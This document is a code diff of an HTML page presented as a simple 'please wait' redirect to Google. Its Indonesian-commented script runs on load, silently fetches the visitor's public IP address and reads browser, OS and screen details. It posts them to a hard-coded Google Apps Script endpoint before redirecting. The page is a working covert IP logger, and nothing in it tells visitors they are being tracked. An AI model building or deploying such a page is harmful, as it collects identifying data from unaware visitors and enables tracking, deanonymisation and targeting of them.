@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Redirecting</title>
+  <title>Tunggu Sebentar...</title>
   <script> var redirectUrl = "https://www.google.com/"; </script>
   <style>
     body {
@@ -36,36 +36,33 @@
 </div>
 
 <script>
-  // Set the manual link's href attribute using the variable
   document.getElementById("redirectLink").href = redirectUrl;
 
-  // Replace with your deployed Google Apps Script Web App URL
   const SCRIPT_URL = 'https://script.google.com/macros/s/AKfycbzqIOZ1iqlwxXwXva_FDQfuVCaGCHkE9lEBU6z00PCLQv8twhpX-khmrlP7skeEXe5GPw/exec';
 
-  // Function to get system information
+  // Fungsi untuk mendapatkan informasi sistem
   function getSystemInfo() {
     const userAgent = navigator.userAgent;
     let browser = 'Unknown';
     let browserVersion = 'Unknown';
     let os = 'Unknown';
-    let deviceType = 'Desktop';
-
-    // Get Browser info
+    
+    // Mendapatkan info Browser
     if (userAgent.includes('Chrome')) {
       browser = 'Chrome';
-      browserVersion = userAgent.match(/Chrome\/(\S+)/)[1];
+      browserVersion = userAgent.match(/Chrome\/(\S+)/)?.[1] || 'N/A';
     } else if (userAgent.includes('Firefox')) {
       browser = 'Firefox';
-      browserVersion = userAgent.match(/Firefox\/(\S+)/)[1];
+      browserVersion = userAgent.match(/Firefox\/(\S+)/)?.[1] || 'N/A';
     } else if (userAgent.includes('Safari') && !userAgent.includes('Chrome')) {
       browser = 'Safari';
-      browserVersion = userAgent.match(/Version\/(\S+)/)[1];
+      browserVersion = userAgent.match(/Version\/(\S+)/)?.[1] || 'N/A';
     } else if (userAgent.includes('Edge')) {
       browser = 'Edge';
-      browserVersion = userAgent.match(/Edge\/(\S+)/)[1];
+      browserVersion = userAgent.match(/Edge\/(\S+)/)?.[1] || 'N/A';
     }
 
-    // Get OS info
+    // Mendapatkan info OS
     if (userAgent.includes('Windows')) {
       os = 'Windows';
     } else if (userAgent.includes('Macintosh')) {
@@ -78,67 +75,66 @@
       os = 'iOS';
     }
 
-    // Get Device Type
-    if (/Mobi|Android|iPhone|iPad/.test(userAgent)) {
-      deviceType = 'Mobile';
-    }
-
     return {
+      Timestamp: new Date().toLocaleString(),
       Browser: browser,
       BrowserVersion: browserVersion,
       OS: os,
-      DeviceType: deviceType,
       ScreenSize: `${window.screen.width}x${window.screen.height}`
     };
   }
 
-  // Asynchronously get public IP address from a third-party service
+  // Fungsi untuk mendapatkan IP publik secara asinkron
   async function getPublicIp() {
     try {
       const response = await fetch('https://api.ipify.org?format=json');
       const data = await response.json();
       return data.ip;
     } catch (error) {
-      console.error('Could not get public IP:', error);
+      console.error('Gagal mendapatkan IP publik:', error);
       return 'IP Fetch Error';
     }
   }
 
-  // Main function to gather data and send it, then redirect
+  // Fungsi utama untuk mengumpulkan data, mengirimnya, dan mengalihkan
   async function logDataAndRedirect() {
-    const publicIp = await getPublicIp();
-    const systemInfo = getSystemInfo();
-
-    const dataToSend = {
-      Timestamp: new Date().toLocaleString(),
-      PublicIP: publicIp,
-      ...systemInfo
-    };
-
-    console.log('Sending data:', dataToSend);
-
     try {
-      const response = await fetch(SCRIPT_URL, {
+      const publicIp = await getPublicIp();
+      const systemInfo = getSystemInfo();
+
+      const dataToSend = {
+        Timestamp: systemInfo.Timestamp,
+        PublicIP: publicIp,
+        Browser: systemInfo.Browser,
+        BrowserVersion: systemInfo.BrowserVersion,
+        OS: systemInfo.OS,
+        ScreenSize: systemInfo.ScreenSize
+      };
+
+      console.log('Mengirim data:', dataToSend);
+
+      // Konversi objek menjadi URLSearchParams untuk format form-urlencoded
+      const formData = new URLSearchParams(dataToSend);
+
+      await fetch(SCRIPT_URL, {
         method: 'POST',
-        mode: 'no-cors', // Use no-cors to prevent CORS issues with App Script
-        cache: 'no-cache',
+        body: formData,
         headers: {
-          'Content-Type': 'application/json',
-        },
-        body: JSON.stringify(dataToSend),
+          'Content-Type': 'application/x-www-form-urlencoded',
+        }
       });
 
-      console.log('Post request sent.');
-      // Note: No-CORS prevents reading the response, but ensures the request goes through.
+      console.log('Permintaan POST berhasil dikirim.');
+
     } catch (error) {
-      console.error('Failed to send data to App Script:', error);
+      console.error('Gagal mengirim data ke Apps Script:', error);
     }
     
-    // Redirect the user immediately after the fetch request is sent
+    // Alihkan pengguna segera setelah permintaan dikirim, terlepas dari keberhasilan atau kegagalannya
     window.location.href = redirectUrl;
   }
 
-  // Call the main function when the page loads
+  // Jalankan fungsi utama saat halaman dimuat
   window.addEventListener('load', logDataAndRedirect);
 </script>
 
